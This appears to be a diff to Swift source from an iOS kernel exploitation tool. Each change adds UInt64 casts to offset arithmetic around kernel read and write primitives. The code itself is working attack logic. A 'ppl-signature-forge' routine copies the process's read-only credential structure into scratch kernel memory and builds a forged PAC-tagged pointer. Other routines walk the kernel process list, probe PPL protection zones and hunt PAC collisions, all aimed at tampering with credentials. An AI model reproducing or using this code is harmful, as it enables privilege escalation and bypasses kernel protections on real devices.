@@ -421,7 +421,7 @@ private func _regPPL() {
         let our_proc = ds_get_our_proc()
         guard our_proc != 0 else { return .fail("ppl-signature-forge: ds_get_our_proc() = 0") }
 
-        let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+        let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
         let stripped_proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
         guard stripped_proc_ro != 0 else {
             return .fail("ppl-signature-forge: proc_ro stripped = 0 — pointer unreadable or null")
@@ -442,14 +442,14 @@ private func _regPPL() {
         ds_kread(stripped_proc_ro, &buf, 0x60)
         ds_kwrite(scratch, &buf, 0x60)
 
-        let scratch_verify = ds_kread64(scratch + off_proc_ro_p_ucred)
-        guard scratch_verify == ds_kread64(stripped_proc_ro + off_proc_ro_p_ucred) else {
+        let scratch_verify = ds_kread64(scratch + UInt64(off_proc_ro_p_ucred))
+        guard scratch_verify == ds_kread64(stripped_proc_ro + UInt64(off_proc_ro_p_ucred)) else {
             return .fail("ppl-signature-forge: scratch write verification failed")
         }
 
         let forged_ptr = scratch | pac_tag
 
-        let raw_ucred = ds_kread64(stripped_proc_ro + off_proc_ro_p_ucred)
+        let raw_ucred = ds_kread64(stripped_proc_ro + UInt64(off_proc_ro_p_ucred))
         let stripped_ucred = raw_ucred & 0x0000000FFFFFFFFF
         let current_uid = ds_kread32(stripped_ucred + 0x18)
 
@@ -593,7 +593,7 @@ private func _regPPLHunter() {
 
         let our_proc = ds_get_our_proc()
         if our_proc != 0 && off_proc_p_proc_ro > 0 {
-            let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+            let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
             let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
             if proc_ro != 0 {
                 report.append(_hunterPTEWalker(targetVA: proc_ro, label: "proc_ro"))
@@ -602,10 +602,10 @@ private func _regPPLHunter() {
         }
 
         if our_proc != 0 && off_proc_p_proc_ro > 0 && off_proc_ro_p_ucred > 0 {
-            let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+            let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
             let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
             if proc_ro != 0 {
-                let raw_ucred = ds_kread64(proc_ro + off_proc_ro_p_ucred)
+                let raw_ucred = ds_kread64(proc_ro + UInt64(off_proc_ro_p_ucred))
                 let ucred = raw_ucred & 0x0000000FFFFFFFFF
                 if ucred != 0 {
                     report.append(_hunterPTEWalker(targetVA: ucred, label: "ucred"))
@@ -646,14 +646,14 @@ private func _hunterZoneScan() -> String {
     while proc != 0 && _isNonPPL(proc) && seen < 512 {
         seen += 1
 
-        let raw_proc_ro = ds_kread64(proc + off_proc_p_proc_ro)
+        let raw_proc_ro = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
         let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
-        let pid = Int32(ds_kread32(proc + off_proc_p_pid))
+        let pid = Int32(ds_kread32(proc + UInt64(off_proc_p_pid)))
 
         var ucred: UInt64 = 0
         var uid: UInt32 = 0xFFFFFFFF
         if proc_ro != 0 && off_proc_ro_p_ucred > 0 {
-            let raw_ucred = ds_kread64(proc_ro + off_proc_ro_p_ucred)
+            let raw_ucred = ds_kread64(proc_ro + UInt64(off_proc_ro_p_ucred))
             ucred = raw_ucred & 0x0000000FFFFFFFFF
             if ucred != 0 && _isNonPPL(ucred) {
                 uid = ds_kread32(ucred + 0x18)
@@ -671,7 +671,7 @@ private func _hunterZoneScan() -> String {
                 ucred, ucNonPPL ? "NON-PPL" : "PPL", uid))
         }
 
-        let next_raw = ds_kread64(proc + off_proc_p_list_le_next)
+        let next_raw = ds_kread64(proc + UInt64(off_proc_p_list_le_next))
         let next = next_raw & 0x0000000FFFFFFFFF
         if next == proc || next == 0 { break }
         proc = next
@@ -709,9 +709,9 @@ private func _hunterForkProbe() -> String {
     let child_pid = getpid()
     let child_proc = our_proc
 
-    let raw_ro = ds_kread64(child_proc + off_proc_p_proc_ro)
+    let raw_ro = ds_kread64(child_proc + UInt64(off_proc_p_proc_ro))
     let child_ro = raw_ro & 0x0000000FFFFFFFFF
-    let raw_uc = child_ro != 0 ? ds_kread64(child_ro + off_proc_ro_p_ucred) : 0
+    let raw_uc = child_ro != 0 ? ds_kread64(child_ro + UInt64(off_proc_ro_p_ucred)) : 0
     let child_ucred = raw_uc & 0x0000000FFFFFFFFF
 
     let roZone = _isNonPPL(child_ro) ? "NON-PPL" : (_isPPLZone(child_ro) ? "PPL" : "UNKNOWN")
@@ -741,12 +741,12 @@ private func _hunterPACCollision() -> String {
 
     var samples: [UInt64] = []
 
-    let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+    let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
     if raw_proc_ro != 0 { samples.append(raw_proc_ro) }
 
     let task = ds_get_our_task()
     if task != 0 && off_task_map > 0 {
-        let raw_map = ds_kread64(task + off_task_map)
+        let raw_map = ds_kread64(task + UInt64(off_task_map))
         if raw_map != 0 { samples.append(raw_map) }
     }
 
